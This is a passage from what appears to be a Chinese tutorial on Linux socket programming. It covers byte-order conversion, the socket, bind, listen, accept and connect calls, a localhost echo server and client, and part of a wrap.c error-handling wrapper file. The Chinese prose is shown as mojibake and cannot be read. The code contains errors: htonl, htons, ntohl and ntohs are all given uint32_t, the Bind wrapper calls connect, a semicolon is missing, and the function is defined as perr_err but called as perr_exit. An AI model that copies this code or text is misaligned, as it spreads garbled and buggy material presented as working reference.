·çš„ï¼Œæ¥æ”¶ä¸»æœºå¦‚æœæ˜¯å°ç«¯å­—èŠ‚åºçš„ï¼Œæ¥åˆ°16ä½çš„æºç«¯å£å·ä¹Ÿè¦åšå­—èŠ‚åºçš„è½¬æ¢ï¼Œå¦‚æœä¸»æœºæ˜¯å¤§ç«¯å­—èŠ‚åºçš„ï¼Œå‘é€å’Œæ¥æ”¶éƒ½ä¸éœ€è¦åšè½¬æ¢ã€‚åŒç†ï¼Œ32ä½çš„IPåœ°å€ä¹Ÿè¦è€ƒè™‘ç½‘ç»œå­—èŠ‚åºå’Œä¸»æœºå­—èŠ‚åºçš„é—®é¢˜ã€‚    </p><p>ä¸ºäº†ä½¿ç½‘ç»œç¨‹åºå…·æœ‰å¯ç§»æ¤æ€§ï¼Œä½¿åŒæ ·çš„Cä»£ç åœ¨å¤§ç«¯å’Œå°ç«¯è®¡ç®—æœºä¸Šç¼–è¯‘åéƒ½èƒ½æ­£å¸¸è¿è¡Œï¼Œå¯ä»¥è°ƒç”¨ä»¥ä¸‹åº“å‡½æ•°åšç½‘ç»œå­—èŠ‚åºå’Œä¸»æœºå­—èŠ‚åºçš„è½¬æ¢ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">htonl</span><span class="params">(<span class="keyword">uint32_t</span> hostlong)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">htons</span><span class="params">(<span class="keyword">uint32_t</span> hostshort)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">ntohl</span><span class="params">(<span class="keyword">uint32_t</span> netlong)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">ntohs</span><span class="params">(<span class="keyword">uint32_t</span> netshort)</span></span>;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­hæ ‡è¯†<code>host</code>ï¼Œnè¡¨ç¤º<code>network</code>ï¼Œlè¡¨ç¤º32ä½é•¿æ•´æ•°ï¼Œsè¡¨ç¤º16ä½çŸ­æ•´æ•°ã€‚å¦‚æœä¸»æœºæ—¶å°ç«¯å­—èŠ‚åºï¼Œè¿™äº›å‡½æ•°å°†å‚æ•°åšç›¸åº”çš„å¤§å°ç«¯è½¬æ¢ç„¶åè¿”å›ï¼Œå¦‚æœä¸»æœºæ—¶å¤§ç«¯å­—èŠ‚åºï¼Œè¿™äº›å‡½æ•°ä¸åšè½¬æ¢ï¼Œå°†å‚æ•°åŸå°ä¸åŠ¨çš„è¿”å›ã€‚</p><h5 id="IPåœ°å€è½¬æ¢å‡½æ•°"><a href="#IPåœ°å€è½¬æ¢å‡½æ•°" class="headerlink" title="IPåœ°å€è½¬æ¢å‡½æ•°"></a>IPåœ°å€è½¬æ¢å‡½æ•°</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">inet_pton</span><span class="params">(<span class="keyword">int</span> af,<span class="keyword">const</span> <span class="keyword">char</span> *src,<span class="keyword">void</span> *dst)</span></span>;</span><br><span class="line"></span><br><span class="line">å‚æ•°</span><br><span class="line">  afï¼šAF_INETã€AF_INET6</span><br><span class="line">  srcï¼šä¼ å…¥ï¼ŒIPåœ°å€ï¼ˆç‚¹åˆ†åè¿›åˆ¶ï¼‰</span><br><span class="line">  dstï¼šä¼ å‡ºï¼Œè½¬æ¢åçš„ç½‘ç»œå­—èŠ‚åºçš„IPåœ°å€</span><br><span class="line">è¿”å›</span><br><span class="line">  æˆåŠŸï¼š<span class="number">1</span></span><br><span class="line">  å¼‚å¸¸ï¼š<span class="number">0</span> è¯´æ˜srcæŒ‡å‘çš„ä¸æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„IPåœ°å€</span><br><span class="line">  å¤±è´¥ï¼š<span class="number">-1</span></span><br></pre></td></tr></table></figure><h4 id="ç½‘ç»œå¥—æ¥å­—å‡½æ•°"><a href="#ç½‘ç»œå¥—æ¥å­—å‡½æ•°" class="headerlink" title="ç½‘ç»œå¥—æ¥å­—å‡½æ•°"></a>ç½‘ç»œå¥—æ¥å­—å‡½æ•°</h4><h5 id="socketå‡½æ•°"><a href="#socketå‡½æ•°" class="headerlink" title="socketå‡½æ•°"></a>socketå‡½æ•°</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line">int socket(int domain,int type,int protocol) åˆ›å»ºä¸€ä¸ªå¥—æ¥å­—</span><br><span class="line">  </span><br><span class="line">domainï¼šAF_INETã€AF_INET6ã€AF_UNIX</span><br><span class="line">typeï¼šSOCK_STREAMã€SOCK_DGRAM</span><br><span class="line">protocolï¼š<span class="number">0</span></span><br><span class="line"></span><br><span class="line">è¿”å›å€¼</span><br><span class="line">  æˆåŠŸï¼šæ–°å¥—æ¥å­—æ‰€å¯¹åº”çš„æ–‡ä»¶æè¿°ç¬¦</span><br><span class="line">  å¤±è´¥ï¼š<span class="number">-1</span> errno</span><br></pre></td></tr></table></figure><h5 id="bindå‡½æ•°"><a href="#bindå‡½æ•°" class="headerlink" title="bindå‡½æ•°"></a>bindå‡½æ•°</h5><p>ç»™socketç»‘å®šä¸€ä¸ªåœ°è´¨ç»“æ„(IP+port)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bind</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> struct sockaddr *addr, <span class="keyword">socklen_t</span> addrlen)</span></span>;</span><br><span class="line"></span><br><span class="line">sockfdï¼šsocketå‡½æ•°è¿”å›å€¼</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span>;</span></span><br><span class="line">addr.sin_family = AF_INET;</span><br><span class="line">addr.sin_port = htons(<span class="number">8888</span>)</span><br><span class="line">  addr.sin_addr.s_addr = htonl(INADDR_ANY);</span><br><span class="line">addrï¼š(struct sockaddr *)&amp;addr</span><br><span class="line">addrlenï¼š<span class="keyword">sizeof</span>(addr)åœ°å€ç»“æ„çš„å¤§å°</span><br><span class="line"></span><br><span class="line">è¿”å›å€¼</span><br><span class="line">  æˆåŠŸï¼š<span class="number">0</span></span><br><span class="line">  å¤±è´¥ï¼š<span class="number">-1</span> errno</span><br></pre></td></tr></table></figure><h5 id="listenå‡½æ•°"><a href="#listenå‡½æ•°" class="headerlink" title="listenå‡½æ•°"></a>listenå‡½æ•°</h5><p>è®¾ç½®åŒæ—¶ä¸æœåŠ¡å™¨å»ºç«‹è¿æ¥çš„ä¸Šé™æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">listen</span><span class="params">(<span class="keyword">int</span> sockfd,<span class="keyword">int</span> backlog)</span></span></span><br><span class="line"><span class="function">  </span></span><br><span class="line">sockfdï¼šsocketå‡½æ•°è¿”å›å€¼</span><br><span class="line">backlogï¼šä¸Šé™æ•°å€¼ï¼Œæœ€å¤§<span class="number">128</span></span><br><span class="line"></span><br><span class="line">è¿”å›å€¼</span><br><span class="line">  æˆåŠŸï¼š<span class="number">0</span></span><br><span class="line">  å¤±è´¥ï¼š<span class="number">-1</span> errno</span><br></pre></td></tr></table></figure><h5 id="acceptå‡½æ•°"><a href="#acceptå‡½æ•°" class="headerlink" title="acceptå‡½æ•°"></a>acceptå‡½æ•°</h5><p>é˜»å¡ç­‰å¾…å®¢æˆ·ç«¯å»ºç«‹è¿æ¥ï¼ŒæˆåŠŸçš„è¯ï¼Œè¿”å›ä¸€ä¸ªä¸å®¢æˆ·ç«¯æˆåŠŸè¿æ¥çš„socketæ–‡ä»¶æè¿°ç¬¦ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">accept</span><span class="params">(<span class="keyword">int</span> sockfd,struct socketaddr *addr,<span class="keyword">socklen_t</span> *addrlen)</span></span>;</span><br><span class="line"></span><br><span class="line">sockfdï¼šsocketå‡½æ•°è¿”å›å€¼</span><br><span class="line">addrï¼šä¼ å‡ºå‚æ•°ï¼ŒæˆåŠŸä¸æœåŠ¡å™¨å»ºç«‹è¿æ¥çš„é‚£ä¸ªå®¢æˆ·ç«¯çš„åœ°å€ç»“æ„(IP+port)</span><br><span class="line">  <span class="keyword">socklen_t</span> clit_addr_len = <span class="keyword">sizeof</span>(addr);</span><br><span class="line">addrlenï¼šä¼ å…¥ä¼ å‡ºã€‚å…¥ï¼šaddrçš„å¤§å°ã€‚å‡ºï¼šå®¢æˆ·ç«¯addrå®é™…å¤§å°</span><br><span class="line">  </span><br><span class="line">è¿”å›å€¼</span><br><span class="line">  æˆåŠŸï¼šèƒ½ä¸æœåŠ¡å™¨è¿›è¡Œæ•°æ®é€šä¿¡çš„socketå¯¹åº”çš„æ–‡ä»¶æè¿°ç¬¦</span><br><span class="line">  å¤±è´¥ï¼š<span class="number">-1</span> errno</span><br></pre></td></tr></table></figure><h5 id="connectå‡½æ•°"><a href="#connectå‡½æ•°" class="headerlink" title="connectå‡½æ•°"></a>connectå‡½æ•°</h5><p>ä½¿ç”¨ç°æœ‰çš„socketä¸æœåŠ¡å™¨å»ºç«‹è¿æ¥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">connect</span><span class="params">(<span class="keyword">int</span> sockfd,<span class="keyword">const</span> struct sockaddr *addr,<span class="keyword">socklen_t</span> addrlen)</span></span>;</span><br><span class="line"></span><br><span class="line">sockfdï¼šsocketå‡½æ•°è¿”å›å€¼</span><br><span class="line">addrï¼šä¼ å…¥å‚æ•°ã€‚æœåŠ¡å™¨çš„åœ°å€ç»“æ„</span><br><span class="line">addrlenï¼šæœåŠ¡å™¨çš„åœ°å€ç»“æ„çš„å¤§å°</span><br><span class="line">  </span><br><span class="line">è¿”å›å€¼</span><br><span class="line">  æˆåŠŸï¼š<span class="number">0</span></span><br><span class="line">  å¤±è´¥ï¼š<span class="number">-1</span> errno</span><br></pre></td></tr></table></figure><h5 id="å®ç°serverç«¯"><a href="#å®ç°serverç«¯" class="headerlink" title="å®ç°serverç«¯"></a>å®ç°serverç«¯</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SERV_PORT 9527</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> lfd = <span class="number">0</span>,cfd = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">char</span> buf[BUFSIZ],client_IP[<span class="number">1024</span>];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serv_addr</span>,<span class="title">clit_addr</span>;</span></span><br><span class="line"><span class="keyword">socklen_t</span> clit_addr_len;</span><br><span class="line">serv_addr.sin_family = AF_INET;</span><br><span class="line">serv_addr.sin_port = htons(SERV_PORT);</span><br><span class="line">serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);</span><br><span class="line">lfd = socket(AF_INET,SOCK_STREAM,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(lfd == <span class="number">-1</span>)&#123;</span><br><span class="line">sys_err(<span class="string">"socket error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bind(lfd,(struct sockaddr *)&amp;serv_addr,<span class="keyword">sizeof</span>(serv_addr));</span><br><span class="line"></span><br><span class="line">listen(lfd,<span class="number">128</span>);</span><br><span class="line"></span><br><span class="line">clit_addr_len = <span class="keyword">sizeof</span>(clit_addr);</span><br><span class="line">cfd = accept(lfd,(struct sockaddr *)&amp;clit_addr,&amp;clit_addr_len);</span><br><span class="line"><span class="keyword">if</span>(cfd == <span class="number">-1</span>)</span><br><span class="line">sys_err(<span class="string">"accept error"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"client ip:%s port:%d\n"</span>,inet_ntop(AF_INET,&amp;clit_addr.sin_addr.s_addr,client_IP,<span class="keyword">sizeof</span>(client_IP)),ntohs(clit_addr.sin_port));</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">ret = read(cfd,buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">write(STDOUT_FILENO,buf,ret);</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;ret;i++)</span><br><span class="line">buf[i] = <span class="built_in">toupper</span>(buf[i]);</span><br><span class="line">write(cfd,buf,ret);</span><br><span class="line">&#125;</span><br><span class="line">close(lfd);</span><br><span class="line">close(cfd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="å®ç°clientç«¯"><a href="#å®ç°clientç«¯" class="headerlink" title="å®ç°clientç«¯"></a>å®ç°clientç«¯</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SERV_PORT 9527</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> cfd;</span><br><span class="line"><span class="keyword">int</span> conter = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">char</span> buf[BUFSIZ];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serv_addr</span>;</span></span><br><span class="line">serv_addr.sin_family = AF_INET;</span><br><span class="line">serv_addr.sin_port = htons(SERV_PORT);</span><br><span class="line">inet_pton(AF_INET,<span class="string">"127.0.0.1"</span>,&amp;serv_addr.sin_addr.s_addr);</span><br><span class="line">cfd = socket(AF_INET,SOCK_STREAM,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(cfd == <span class="number">-1</span>)</span><br><span class="line">sys_err(<span class="string">"socket error"</span>);</span><br><span class="line"><span class="keyword">int</span> ret = connect(cfd,(struct sockaddr *)&amp;serv_addr,<span class="keyword">sizeof</span>(serv_addr));</span><br><span class="line"><span class="keyword">if</span>(ret != <span class="number">0</span>)</span><br><span class="line">sys_err(<span class="string">"connect err"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(--conter)&#123;</span><br><span class="line">write(cfd,<span class="string">"hello\n"</span>,<span class="number">6</span>);</span><br><span class="line">ret = read(cfd,buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">write(STDOUT_FILENO,buf,ret);</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">close(cfd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="å®ç°å¤šè¿›ç¨‹å¹¶å‘æœåŠ¡å™¨"><a href="#å®ç°å¤šè¿›ç¨‹å¹¶å‘æœåŠ¡å™¨" class="headerlink" title="å®ç°å¤šè¿›ç¨‹å¹¶å‘æœåŠ¡å™¨"></a>å®ç°å¤šè¿›ç¨‹å¹¶å‘æœåŠ¡å™¨</h5><p>é¦–å…ˆå®ç°åŠŸèƒ½å°è£…å‡½æ•°<code>wrap.c</code>ï¼Œä»£ç å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"wrap.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">perr_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Accept</span><span class="params">(<span class="keyword">int</span> fd,struct sockaddr *sa,<span class="keyword">socklen_t</span> *salenptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"></span><br><span class="line">again:</span><br><span class="line"><span class="keyword">if</span>((n = accept(fd,sa,salenptr)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>((errno == ECONNABORTED) || (errno == EINTR))</span><br><span class="line"><span class="keyword">goto</span> again;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">perr_exit(<span class="string">"accept error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Bind</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">const</span> struct sockaddr *sa,<span class="keyword">socklen_t</span> salen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line">n = connect(fd,sa,salen)</span><br><span class="line"><span class="keyword">if</span>(n&lt;<span class="number">0</span>)&#123;</span><br><span class="line">perr_exit(<span class="string">"connect error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Socket</span><span class="params">(<span class="keyword">int</span> domain,<span class="keyword">int</span> type,<span class="keyword">int</span> protocol)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line">n = socket(domain,type,protocol);</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">-1</span>)&#123;</span><br><span class="line">sys_err(<span class="string">"socket error"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> n;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Listen</span><span class="params">(<span class="keyword">int</span> sockfd,<span class="keyword">int</span> backlog)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line">n = listen(sockfd,backlog);</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">-1</span>)&#123;</span><br><span class="line">sys_err(<span class="string">"listen error"</span>);</span><br><span class="line"><span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Connect</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">const</span> struct sockaddr 